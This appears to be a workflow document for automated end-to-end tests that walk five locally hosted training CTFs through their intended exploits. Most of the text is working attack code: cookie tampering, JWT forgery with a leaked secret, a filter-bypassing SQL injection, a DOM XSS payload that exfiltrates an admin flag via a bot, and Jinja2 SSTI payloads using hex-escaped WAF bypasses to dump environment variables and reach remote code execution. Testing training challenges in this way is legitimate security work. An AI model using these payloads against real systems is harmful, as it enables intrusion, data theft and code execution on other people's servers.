# End-to-End Exploit Verification Scripts -- Workflow

This document describes how to implement automated exploit verification scripts for all 5 CTFs. Each script programmatically walks through the full intended exploit chain and confirms the flag is retrieved, providing regression testing of every exploit path.

---

## Directory Structure

```
CTFs/
  e2e/
    ctf1_exploit.py          # Cookie tampering (requests)
    ctf2_exploit.py          # PoW + JWT forge (requests + PyJWT)
    ctf3_exploit.py          # Path traversal + SQLi + AES decrypt (requests + pycryptodome)
    ctf4_exploit.py          # XSS bot chain (requests + polling)
    ctf5_exploit.py          # SSTI → WAF bypass → RCE (requests)
    requirements.txt         # Shared Python dependencies
    conftest.py              # Shared pytest fixtures (health checks, retry logic)
    run_all.sh               # Run all exploit scripts sequentially
    README.md                # How to use
```

All scripts are written in Python using `requests` (except CTF4 which optionally uses Playwright). Python is chosen over bash/Node for consistency and because `requests` + `pycryptodome` + `PyJWT` covers all 5 CTFs.

---

## Shared Dependencies

### `e2e/requirements.txt`

```
requests>=2.31
pytest>=8.0
PyJWT>=2.8
pycryptodome>=3.20
```

Playwright is NOT required -- CTF4's XSS exploit can be verified purely with HTTP requests since the bot is an internal service. If Playwright-based verification is desired later, add `playwright>=1.40` and a separate `ctf4_exploit_browser.py`.

---

## Shared Fixtures

### `e2e/conftest.py`

Provide reusable pytest fixtures:

```python
import pytest, requests, time

def wait_for_service(url, timeout=60, interval=2):
    """Block until service responds 200, or raise after timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code < 500:
                return
        except requests.ConnectionError:
            pass
        time.sleep(interval)
    raise TimeoutError(f"Service {url} not ready after {timeout}s")
```

Each test module calls `wait_for_service()` in a session-scoped fixture before running exploits.

---

## CTF 1: Cookie Tampering (Basic_1_Nodejs)

**Target:** `http://localhost:3000`
**Exploit:** Decode Base64 session cookie → change `role` to `admin` → access `/flag`

### `e2e/ctf1_exploit.py`

```python
"""CTF1: Base64 cookie tampering → privilege escalation → flag."""
import requests, base64, json, pytest

BASE = "http://localhost:3000"

@pytest.fixture(scope="module", autouse=True)
def _ready():
    from conftest import wait_for_service
    wait_for_service(BASE)

class TestCTF1Exploit:

    def test_full_exploit(self):
        s = requests.Session()

        # Step 1: Login as regular user
        resp = s.post(f"{BASE}/login", data={
            "username": "abcd12",
            "password": "password",
        }, allow_redirects=False)
        assert resp.status_code in (200, 302), f"Login failed: {resp.status_code}"

        # Step 2: Extract session cookie
        cookie = s.cookies.get("session")
        assert cookie, "No session cookie found after login"

        # Step 3: Decode Base64 → JSON → modify role → re-encode
        decoded = json.loads(base64.b64decode(cookie))
        assert decoded.get("role") == "user", f"Expected role=user, got {decoded}"
        decoded["role"] = "admin"
        forged = base64.b64encode(json.dumps(decoded).encode()).decode()

        # Step 4: Set forged cookie and access /flag
        s.cookies.set("session", forged)
        resp = s.get(f"{BASE}/flag")
        assert resp.status_code == 200
        # Flag should be in the response body
        assert "durham" in resp.text.lower() or "flag" in resp.text.lower(), \
            f"Flag not found in response: {resp.text[:200]}"
        print(f"[CTF1] Flag retrieved successfully")
```

### Key implementation notes:
- Read credentials from `Basic_1_Nodejs/.env` or hardcode the seeded defaults (`abcd12`/`password`).
- The cookie is unsigned Base64 -- no HMAC or JWT to deal with.
- Assertion: response body contains the flag string (match `durham` or the per-user flag prefix).

---

## CTF 2: PoW + JWT Forgery (CTF_2_pswd_manager)

**Target API:** `http://localhost:4000`, **Target Web:** `http://localhost:5173`
**Exploit:** Solve PoW → get JWT secret → forge JWT for `flag12` → read vault

### `e2e/ctf2_exploit.py`

```python
"""CTF2: Proof-of-Work → JWT secret disclosure → JWT forgery → vault IDOR → flag."""
import requests, hashlib, jwt, pytest

API = "http://localhost:4000"

@pytest.fixture(scope="module", autouse=True)
def _ready():
    from conftest import wait_for_service
    wait_for_service(API)

def solve_pow(nonce: str, difficulty: int) -> str:
    """Brute-force a suffix such that sha256(nonce + suffix) has `difficulty` leading zeros."""
    prefix = "0" * difficulty
    for i in range(10_000_000):
        suffix = str(i)
        h = hashlib.sha256((nonce + suffix).encode()).hexdigest()
        if h.startswith(prefix):
            return suffix
    raise RuntimeError("PoW not solved within limit")

class TestCTF2Exploit:

    def test_full_exploit(self):
        s = requests.Session()

        # Step 1: Login as regular user
        resp = s.post(f"{API}/api/auth/login", json={
            "username": "abcd12",
            "password": "password",
        })
        assert resp.status_code == 200, f"Login failed: {resp.text}"
        token = resp.json().get("token") or resp.cookies.get("session")
        assert token, "No auth token received"

        # Step 2: Get PoW challenge
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        resp = s.get(f"{API}/api/challenge", headers=headers)
        assert resp.status_code == 200
        data = resp.json()
        nonce = data["nonce"]
        difficulty = data["difficulty"]

        # Step 3: Solve PoW
        suffix = solve_pow(nonce, difficulty)

        # Step 4: Submit solution → get JWT secret
        resp = s.post(f"{API}/api/challenge/solve", json={
            "nonce": nonce,
            "suffix": suffix,
        }, headers=headers)
        assert resp.status_code == 200
        secret = resp.json().get("JWT_SECRET") or resp.json().get("secret")
        assert secret, f"No secret in response: {resp.json()}"

        # Step 5: Forge JWT for target user (flag12)
        forged_token = jwt.encode({"sub": "flag12"}, secret, algorithm="HS256")

        # Step 6: Access vault with forged token
        resp = s.get(f"{API}/api/vault", headers={
            "Authorization": f"Bearer {forged_token}",
        })
        # Or set as cookie depending on implementation
        if resp.status_code == 401:
            s.cookies.set("session", forged_token)
            resp = s.get(f"{API}/api/vault")

        assert resp.status_code == 200
        body = resp.text
        assert "flag" in body.lower() or "durham" in body.lower(), \
            f"Flag not found in vault: {body[:300]}"
        print(f"[CTF2] Flag retrieved successfully")
```

### Key implementation notes:
- PoW solver: SHA-256 brute force; difficulty is typically 4-5 leading zeros (solves in <5s).
- JWT: use `PyJWT` to forge token with `sub: "flag12"`.
- Auth flow may use Bearer tokens or cookies -- try both.
- Adjust the `/api/challenge`, `/api/challenge/solve`, `/api/vault` routes if the actual API paths differ (read the Express routes to confirm).

---

## CTF 3: Path Traversal + SQLi + AES Decrypt (CTF_3_HR-system)

**Target API:** `http://localhost:8004`, **Target Web:** `http://localhost:5174`
**Exploit:** 4 flags across path traversal, source code review, SQL injection, and cryptographic decryption.

### `e2e/ctf3_exploit.py`

```python
"""CTF3: Path traversal → source code key → SQLi → AES-256-CBC decryption → 4 flags."""
import requests, hashlib, base64, json, pytest
from Crypto.Cipher import AES

API = "http://localhost:8004"
WEB = "http://localhost:5174"

@pytest.fixture(scope="module", autouse=True)
def _ready():
    from conftest import wait_for_service
    wait_for_service(API)
    wait_for_service(WEB)

def get_auth_token(username="abcd12", password="CZodHzKS"):
    """Login and return Bearer token."""
    resp = requests.post(f"{API}/api/auth/login", json={
        "username": username,
        "password": password,
    })
    assert resp.status_code == 200, f"Login failed: {resp.text}"
    return resp.json()["token"]

class TestCTF3Exploit:

    def test_flag1_path_traversal(self):
        """Flag 1: Access /flag route via path traversal hint."""
        resp = requests.get(f"{WEB}/flag")
        assert resp.status_code == 200
        assert "durham-hr" in resp.text, f"Flag 1 not found: {resp.text[:200]}"
        print(f"[CTF3-Flag1] Retrieved via path traversal")

    def test_flag2_source_code_key(self):
        """Flag 2: Encryption key found in frontend source (legacyAuth.ts)."""
        # The key is embedded in the built JS bundle
        # Fetch the main JS bundle and search for the key
        resp = requests.get(f"{WEB}/")
        assert resp.status_code == 200

        # Find JS bundle URLs in the HTML
        import re
        scripts = re.findall(r'src="(/assets/[^"]+\.js)"', resp.text)
        key_found = False
        for script_path in scripts:
            js_resp = requests.get(f"{WEB}{script_path}")
            if "CTF_2026_SECRET_KEY_XJ9K2L" in js_resp.text:
                key_found = True
                break
        assert key_found, "Encryption key not found in JS bundles"
        print(f"[CTF3-Flag2] Key found: CTF_2026_SECRET_KEY_XJ9K2L")

    def test_flag3_sqli(self):
        """Flag 3: SQL injection in employee search reveals hidden employee."""
        token = get_auth_token()
        headers = {"Authorization": f"Bearer {token}"}

        # SQLi payload: no-space variant bypasses filter
        resp = requests.get(
            f"{API}/api/employees",
            params={"search": "'OR 1=1--"},
            headers=headers,
        )
        assert resp.status_code == 200
        data = resp.json()

        # Find the FLAG012 employee
        flag_employee = None
        employees = data if isinstance(data, list) else data.get("data", data.get("employees", []))
        for emp in employees:
            eid = emp.get("employee_id", "")
            if "FLAG" in eid.upper():
                flag_employee = emp
                break
        assert flag_employee, f"FLAG employee not found in SQLi results: {data}"
        print(f"[CTF3-Flag3] Hidden employee found: {flag_employee.get('employee_id')}")

    def test_flag4_aes_decrypt(self):
        """Flag 4: Decrypt AES-256-CBC ciphertext using key from Flag 2."""
        encrypted = "2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819"
        key_passphrase = "CTF_2026_SECRET_KEY_XJ9K2L"

        iv_b64, ciphertext_b64 = encrypted.split(":")
        key = hashlib.sha256(key_passphrase.encode()).digest()
        iv = base64.b64decode(iv_b64)
        ciphertext = base64.b64decode(ciphertext_b64)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        # Remove PKCS7 padding or null bytes
        plaintext = decrypted.rstrip(b"\x00").rstrip(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10")
        plaintext = plaintext.decode("utf-8", errors="ignore").strip()

        assert "durham-hr" in plaintext, f"Decrypted text doesn't contain flag: {plaintext}"
        print(f"[CTF3-Flag4] Decrypted: {plaintext}")
```

### Key implementation notes:
- **Flag 1**: Directly fetch `http://localhost:5174/flag` -- the React app serves it.
- **Flag 2**: Scan JS bundles for the hardcoded key. The exact string `CTF_2026_SECRET_KEY_XJ9K2L` is in `legacyAuth.ts` which gets bundled by Vite.
- **Flag 3**: SQLi payload `'OR 1=1--` (no space) bypasses the input filter. Adapt the employee list response parsing to the actual JSON structure.
- **Flag 4**: AES-256-CBC decryption. The encrypted string and key are static per deployment (from `credentials.json`). Read `credentials.json` at runtime if you want this to work across regenerated flags.
- Credentials are read from `credentials.json` -- adapt if regenerated.

---

## CTF 4: XSS Bot Exploit (CTF_4_corporate_helpdesk)

**Target API:** `http://localhost:4001`, **Target Web:** `http://localhost:5174`
**Exploit:** DOM XSS via `callback` param → admin bot visits crafted URL → exfiltrates flag

### `e2e/ctf4_exploit.py`

```python
"""CTF4: DOM XSS → bot-driven admin flag exfiltration → flag capture."""
import requests, time, pytest, json

API = "http://localhost:4001"
WEB = "http://localhost:5174"

@pytest.fixture(scope="module", autouse=True)
def _ready():
    from conftest import wait_for_service
    wait_for_service(API)

def login(username="abcd12", password="KHXXSIILQYIF"):
    """Login and return session."""
    s = requests.Session()
    resp = s.post(f"{API}/api/auth/login", json={
        "username": username,
        "password": password,
    })
    assert resp.status_code == 200, f"Login failed: {resp.text}"
    data = resp.json()
    if "token" in data:
        s.headers["Authorization"] = f"Bearer {data['token']}"
    return s

class TestCTF4Exploit:

    def test_xss_callback_injection(self):
        """Verify the callback parameter executes arbitrary JS (knowledge base XSS)."""
        # This is a DOM-level vuln, so we just verify the endpoint accepts the param
        resp = requests.get(f"{WEB}/kb", params={
            "search": "test",
            "callback": "alert(1)",
        })
        assert resp.status_code == 200
        # The callback value should appear in the HTML (it's eval'd client-side)
        assert "callback" in resp.url or resp.status_code == 200

    def test_full_exploit_chain(self):
        """Submit XSS payload via report → bot visits as admin → exfiltrate flag."""
        s = login()

        # Step 1: Clear any previous captures
        # (optional, depends on API)

        # Step 2: Craft the XSS payload URL
        # The bot visits the URL as admin. The callback eval's JS that:
        #   1. Reads _reportId from URL params
        #   2. Fetches /api/admin/flag?reportId=<id> (admin-only endpoint)
        #   3. Posts the flag to /api/exfil/capture
        callback_payload = (
            "fetch('/api/admin/flag?reportId='.concat("
            "new URLSearchParams(location.search).get('_reportId')))"
            ".then(function(r){return r.json()})"
            ".then(function(d){fetch('/api/exfil/capture',"
            "{method:'POST',headers:{'Content-Type':'application/json'},"
            "body:JSON.stringify({data:d,"
            "reportId:new URLSearchParams(location.search).get('_reportId')})})})"
        )

        xss_url = (
            f"http://web:5173/kb"
            f"?search=test"
            f"&callback={callback_payload}"
        )

        # Step 3: Submit the URL as a report (bot will visit it)
        resp = s.post(f"{API}/api/reports", json={"url": xss_url})
        assert resp.status_code in (200, 201), f"Report submission failed: {resp.text}"
        report_data = resp.json()
        report_id = report_data.get("id") or report_data.get("reportId")

        # Step 4: Wait for bot to process (polls every 2s, processes within 5s)
        time.sleep(8)

        # Step 5: Check captures for the exfiltrated flag
        resp = s.get(f"{API}/api/exfil/captures")
        assert resp.status_code == 200
        captures = resp.json()

        # Find capture matching our report
        flag_found = False
        flag_value = None
        capture_list = captures if isinstance(captures, list) else captures.get("captures", [])
        for capture in capture_list:
            data = capture.get("data", {})
            if isinstance(data, str):
                data = json.loads(data) if data.startswith("{") else {"raw": data}
            flag_val = data.get("flag", "") if isinstance(data, dict) else str(data)
            if "CTF{" in str(data):
                flag_found = True
                flag_value = str(data)
                break

        assert flag_found, f"Flag not found in captures: {captures}"
        assert "CTF{" in flag_value
        print(f"[CTF4] Flag exfiltrated: {flag_value}")
```

### Key implementation notes:
- **No Playwright needed** for the verification script. The bot is an internal Playwright service -- the script just submits a report URL and polls for captures.
- The XSS URL must use `http://web:5173` (Docker internal hostname) since the bot runs inside Docker.
- Use `.concat()` not `+` in the callback (URL encoding turns `+` into space).
- Wait 5-10s for the bot to process the report.
- The captures endpoint returns exfiltrated data. Match on `CTF{` prefix.
- Credentials from `credentials.json`: `abcd12` / `KHXXSIILQYIF`.
- **Adjust API routes** if they differ (read the Express router to confirm exact paths: `/api/reports`, `/api/exfil/captures`, `/api/admin/flag`).

---

## CTF 5: SSTI → WAF Bypass → RCE (CTF_5_internal_blog)

**Target:** `http://localhost:5175`
**Exploit:** 4 flags across info disclosure, SSTI, WAF bypass, and RCE.

### `e2e/ctf5_exploit.py`

```python
"""CTF5 NovaCMS: Info disclosure → SSTI → WAF bypass → RCE → 4 flags."""
import requests, pytest

BASE = "http://localhost:5175"

@pytest.fixture(scope="module", autouse=True)
def _ready():
    from conftest import wait_for_service
    wait_for_service(BASE)

@pytest.fixture(scope="module")
def session():
    """Authenticated session."""
    s = requests.Session()
    resp = s.post(f"{BASE}/login", data={
        "username": "abcd12",
        "password": "<from_credentials_json>",
    }, allow_redirects=True)
    assert resp.status_code == 200
    assert b"Dashboard" in resp.content or "dashboard" in resp.url.lower()
    return s

class TestCTF5Exploit:

    def test_flag1_info_disclosure(self, session):
        """Flag 1: Hidden API with debug token → flag in JSON response."""
        # Step 1: /health reveals debug token hint
        resp = requests.get(f"{BASE}/health")
        assert resp.status_code == 200
        health = resp.json()
        assert "X-Debug-Token" in health.get("note", "")

        # Step 2: /api/status with the correct header
        resp = session.get(f"{BASE}/api/status", headers={
            "X-Debug-Token": "novacms-internal",
        })
        assert resp.status_code == 200
        data = resp.json()
        assert "durham-cms-flag1{" in data.get("flag", ""), f"Flag 1 not found: {data}"
        print(f"[CTF5-Flag1] {data['flag']}")

    def test_flag2_ssti_config_leak(self, session):
        """Flag 2: Basic SSTI on v1 → {{config}} reveals SECRET_KEY."""
        resp = session.post(f"{BASE}/preview", data={
            "body": "{{config}}",
        })
        assert resp.status_code == 200
        assert "novacms-dev-2024" in resp.text, f"SECRET_KEY not in config dump"
        print(f"[CTF5-Flag2] SECRET_KEY: novacms-dev-2024")

    def test_flag3_waf_bypass(self, session):
        """Flag 3: WAF bypass on v2 → os.environ dump → WAF_FLAG3."""
        payload = (
            "{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
            "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x62uiltins\\x5f\\x5f')"
            "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x69mport\\x5f\\x5f')('\\x6f\\x73')"
            "|attr('environ')}}"
        )
        resp = session.post(f"{BASE}/preview/v2", data={"body": payload})
        assert resp.status_code == 200
        assert "WAF_FLAG3" in resp.text, f"WAF_FLAG3 not in environ dump"
        assert "durham-cms-flag3{" in resp.text
        print(f"[CTF5-Flag3] Found in os.environ")

    def test_flag4_rce(self, session):
        """Flag 4: RCE via os.popen → cat /app/secret/flag.txt."""
        payload = (
            "{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
            "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x62uiltins\\x5f\\x5f')"
            "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x69mport\\x5f\\x5f')('\\x6f\\x73')"
            "|attr('p\\x6fpen')('cat /app/secret/flag.txt')"
            "|attr('read')()}}"
        )
        resp = session.post(f"{BASE}/preview/v2", data={"body": payload})
        assert resp.status_code == 200
        assert "durham-cms-flag4{" in resp.text, f"Flag 4 not found: {resp.text[:300]}"
        print(f"[CTF5-Flag4] RCE successful")
```

### Key implementation notes:
- Password must be read from `credentials.json` at runtime (it's generated per deployment).
- Flag 1 requires an authenticated session for the `/api/status` endpoint to return the per-user flag.
- Flag 2 uses the v1 (unfiltered) preview endpoint.
- Flags 3 & 4 use the v2 (WAF-filtered) endpoint with hex-encoded payloads.
- All payloads are verified in the existing unit tests (`tests/test_waf_bypass.py`).

---

## Runner Script

### `e2e/run_all.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

pip install -q -r requirements.txt 2>/dev/null

echo "=========================================="
echo "  CTF End-to-End Exploit Verification"
echo "=========================================="

FAILED=0

for ctf in ctf1 ctf2 ctf3 ctf4 ctf5; do
    echo ""
    echo "--- ${ctf^^} ---"
    if python -m pytest "${ctf}_exploit.py" -v --tb=short 2>&1; then
        echo "[PASS] ${ctf^^}"
    else
        echo "[FAIL] ${ctf^^}"
        FAILED=$((FAILED + 1))
    fi
done

echo ""
echo "=========================================="
if [ "$FAILED" -eq 0 ]; then
    echo "  ALL CTFs PASSED"
else
    echo "  $FAILED CTF(s) FAILED"
    exit 1
fi
```

---

## Implementation Steps

### Phase 1: Scaffolding

1. Create `CTFs/e2e/` directory.
2. Write `requirements.txt` with `requests`, `pytest`, `PyJWT`, `pycryptodome`.
3. Write `conftest.py` with `wait_for_service()` helper.
4. Write `run_all.sh` runner script.

### Phase 2: CTF1 Script (Simplest)

1. Write `ctf1_exploit.py` following the template above.
2. Read `Basic_1_Nodejs/.env` to confirm credentials (or hardcode `abcd12`/`password`).
3. Verify: `docker compose -f ../Basic_1_Nodejs/docker-compose.yml up -d && pytest ctf1_exploit.py -v`.

### Phase 3: CTF5 Script (Most Testable)

1. Write `ctf5_exploit.py` -- all 4 flags in one file.
2. Read credentials from `CTF_5_internal_blog/credentials.json` at runtime.
3. Verify: `docker compose -f ../CTF_5_internal_blog/docker-compose.yml up -d && pytest ctf5_exploit.py -v`.

### Phase 4: CTF2 Script

1. Write `ctf2_exploit.py` with PoW solver.
2. The PoW solver must handle variable difficulty. Start with brute-force SHA-256 prefix matching.
3. Read the Express routes to confirm exact API paths (`/api/challenge`, `/api/challenge/solve`, `/api/vault`).
4. Verify against running containers.

### Phase 5: CTF3 Script

1. Write `ctf3_exploit.py` with all 4 flags.
2. Flag 1 (path traversal) and Flag 2 (JS bundle key) are HTTP-only.
3. Flag 3 (SQLi) requires auth token + correct search param format.
4. Flag 4 (AES decrypt) is offline crypto -- no network call needed.
5. Read `credentials.json` for dynamic credentials and encrypted data.
6. **Important**: The encrypted string in `credentials.json` may change per generation. Read it dynamically from the `flag12` user's `notes` field.

### Phase 6: CTF4 Script (Most Complex)

1. Write `ctf4_exploit.py` using requests only (no Playwright).
2. The XSS URL must reference `http://web:5173` (the Docker-internal hostname for the bot).
3. After submitting the report, poll `/api/exfil/captures` with backoff (up to 15s).
4. Read the Express routes to confirm:
   - Report submission: `POST /api/reports` with `{url: "..."}`
   - Captures retrieval: `GET /api/exfil/captures`
   - Admin flag endpoint (bot-only): `GET /api/admin/flag?reportId=N`
5. Read `credentials.json` for test user credentials.

### Phase 7: Integration & Runner

1. Test `run_all.sh` with all 5 CTFs running simultaneously.
2. Confirm port allocations don't conflict (3000, 4000, 5173, 5174, 8004, 4001, 5175).
3. Add a `docker-compose.e2e.yml` at the `CTFs/` level if desired -- or just rely on per-CTF compose files.

---

## Credential Handling

Each script must resolve credentials dynamically:

| CTF | Credential Source | Default Test User |
|-----|------------------|-------------------|
| CTF1 | Hardcoded in `.env` or app | `abcd12` / `password` |
| CTF2 | Hardcoded in app config | `abcd12` / `password` |
| CTF3 | `CTF_3_HR-system/credentials.json` | `abcd12` / `CZodHzKS` |
| CTF4 | `CTF_4_corporate_helpdesk/credentials.json` | `abcd12` / `KHXXSIILQYIF` |
| CTF5 | `CTF_5_internal_blog/credentials.json` | `abcd12` / (generated) |

For CTFs with `credentials.json`, read the file at runtime:

```python
import json, os

def load_creds(ctf_dir, username="abcd12"):
    path = os.path.join(os.path.dirname(__file__), "..", ctf_dir, "credentials.json")
    with open(path) as f:
        return json.load(f)[username]["password"]
```

---

## CI Integration (GitHub Actions)

### `.github/workflows/ctf-e2e.yml` (optional, future)

```yaml
name: CTF E2E Exploit Verification

on:
  push:
    paths: ['CTFs/**']
  workflow_dispatch:

jobs:
  e2e:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        ctf: [ctf1, ctf2, ctf3, ctf4, ctf5]
    steps:
      - uses: actions/checkout@v4

      - name: Start CTF containers
        run: |
          cd CTFs
          # Map CTF names to compose directories
          case "${{ matrix.ctf }}" in
            ctf1) cd Basic_1_Nodejs ;;
            ctf2) cd CTF_2_pswd_manager ;;
            ctf3) cd CTF_3_HR-system ;;
            ctf4) cd CTF_4_corporate_helpdesk ;;
            ctf5) cd CTF_5_internal_blog ;;
          esac
          docker compose up -d --build --wait

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: pip install -r CTFs/e2e/requirements.txt

      - name: Run exploit verification
        run: |
          cd CTFs/e2e
          python -m pytest ${{ matrix.ctf }}_exploit.py -v --tb=short

      - name: Tear down
        if: always()
        run: |
          cd CTFs
          case "${{ matrix.ctf }}" in
            ctf1) cd Basic_1_Nodejs ;;
            ctf2) cd CTF_2_pswd_manager ;;
            ctf3) cd CTF_3_HR-system ;;
            ctf4) cd CTF_4_corporate_helpdesk ;;
            ctf5) cd CTF_5_internal_blog ;;
          esac
          docker compose down -v
```

### CI notes:
- Matrix strategy runs all 5 CTFs in parallel.
- Each job: build containers → run exploit script → teardown.
- CTF4 needs extra time for the bot service to initialise (~10s).
- CTF3 needs PostgreSQL health check to pass before backend starts.

---

## Assertions & What Constitutes "Pass"

Each script must assert:

| CTF | Assertion |
|-----|-----------|
| CTF1 | Response body contains a flag string after cookie tampering |
| CTF2 | Vault response contains flag after JWT forgery |
| CTF3-F1 | `/flag` returns `durham-hr{...}` |
| CTF3-F2 | JS bundle contains `CTF_2026_SECRET_KEY_XJ9K2L` |
| CTF3-F3 | SQLi returns employee with `FLAG` in employee_id |
| CTF3-F4 | AES decryption produces `durham-hr{...}` |
| CTF4 | Captures endpoint contains `CTF{...}` after bot processing |
| CTF5-F1 | `/api/status` with debug token returns `durham-cms-flag1{...}` |
| CTF5-F2 | `{{config}}` on v1 preview contains `novacms-dev-2024` |
| CTF5-F3 | WAF bypass on v2 returns `durham-cms-flag3{...}` in environ dump |
| CTF5-F4 | RCE payload on v2 returns `durham-cms-flag4{...}` |

---

## Risk Notes

- **CTF4 is timing-sensitive**: the bot must process the report before we check captures. Use polling with exponential backoff (2s, 4s, 8s) up to 15s, not a fixed `time.sleep()`.
- **CTF3 credentials change per generation**: always read `credentials.json`, never hardcode passwords (except defaults for CTF1/CTF2).
- **CTF5 passwords are generated**: the `credentials.json` is written by the flag generator and mounted read-only into Docker.
- **Port conflicts**: if running all CTFs simultaneously, CTF3 and CTF4 both use port 5174 for their frontend. Run them sequentially or remap ports.

---

## How to Verify Everything Works

All scripts have been implemented in `CTFs/e2e/`. Below are the commands to verify each CTF individually and all together.

### Prerequisites

```bash
cd CTFs/e2e
pip3 install -r requirements.txt
```

### Test a Single CTF

Each CTF must have its Docker containers running before you run its exploit script. The scripts include a `wait_for_service()` fixture that waits up to 60s for the service to be reachable.

**CTF1** (port 3000):
```bash
cd CTFs/Basic_1_Nodejs && docker compose up -d --build
cd CTFs/e2e && python3 -m pytest ctf1_exploit.py -v --tb=short
```

**CTF2** (ports 4000, 5173):
```bash
cd CTFs/CTF_2_pswd_manager && docker compose up -d --build
cd CTFs/e2e && python3 -m pytest ctf2_exploit.py -v --tb=short
```

**CTF3** (ports 8004, 5174) -- wait ~30s for PostgreSQL + Laravel migrations:
```bash
cd CTFs/CTF_3_HR-system && docker compose up -d --build
# Wait for backend health check
sleep 30
cd CTFs/e2e && python3 -m pytest ctf3_exploit.py -v --tb=short
```

**CTF4** (ports 4001, 5174) -- NOTE: conflicts with CTF3 on port 5174, don't run both:
```bash
cd CTFs/CTF_4_corporate_helpdesk && docker compose up -d --build
# Wait for DB + Redis + bot init
sleep 15
cd CTFs/e2e && python3 -m pytest ctf4_exploit.py -v --tb=short
```

**CTF5** (port 5175):
```bash
cd CTFs/CTF_5_internal_blog && docker compose up -d --build
cd CTFs/e2e && python3 -m pytest ctf5_exploit.py -v --tb=short
```

### Test All CTFs Sequentially

Because CTF3 and CTF4 share port 5174, run them one at a time:

```bash
cd CTFs/e2e

# CTF1
(cd ../Basic_1_Nodejs && docker compose up -d --build)
python3 -m pytest ctf1_exploit.py -v --tb=short
(cd ../Basic_1_Nodejs && docker compose down)

# CTF2
(cd ../CTF_2_pswd_manager && docker compose up -d --build)
python3 -m pytest ctf2_exploit.py -v --tb=short
(cd ../CTF_2_pswd_manager && docker compose down)

# CTF3
(cd ../CTF_3_HR-system && docker compose up -d --build)
sleep 30
python3 -m pytest ctf3_exploit.py -v --tb=short
(cd ../CTF_3_HR-system && docker compose down -v)

# CTF4
(cd ../CTF_4_corporate_helpdesk && docker compose up -d --build)
sleep 15
python3 -m pytest ctf4_exploit.py -v --tb=short
(cd ../CTF_4_corporate_helpdesk && docker compose down -v)

# CTF5
(cd ../CTF_5_internal_blog && docker compose up -d --build)
python3 -m pytest ctf5_exploit.py -v --tb=short
(cd ../CTF_5_internal_blog && docker compose down -v)
```

### What Success Looks Like

Each script outputs `PASSED` for every test. A full run produces:

```
CTF1:  2 passed   (cookie tampering -> flag)
CTF2:  2 passed   (PoW solve -> JWT forge -> vault flag)
CTF3:  5 passed   (path traversal + key discovery + SQLi + AES decrypt)
CTF4:  3 passed   (admin endpoint probe + exfil test + full XSS chain)
CTF5:  7 passed   (health hints + flag1 + SSTI + config leak + WAF block + flag3 bypass + RCE flag4)
       --------
       19 total tests across 11 flags
```

### Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `TimeoutError: Service not ready` | Container not running or still starting | Run `docker compose up -d` and wait for health checks |
| CTF2 PoW takes >30s | Difficulty higher than expected | Check `/api/challenge` response; difficulty=4 should solve in <5s |
| CTF3 login 401 | Credentials changed after flag regeneration | Re-read `credentials.json` -- the script does this automatically |
| CTF4 "Flag not found in captures" | Bot service not running or can't reach `web:5173` | Check `docker compose logs bot` for errors |
| CTF4 port conflict with CTF3 | Both use 5174 | Stop CTF3 before starting CTF4: `docker compose down` |
| CTF5 flag3/flag4 "Blocked" | Hex encoding not working | Verify `\x5f` is not being double-escaped; check with `curl` manually |
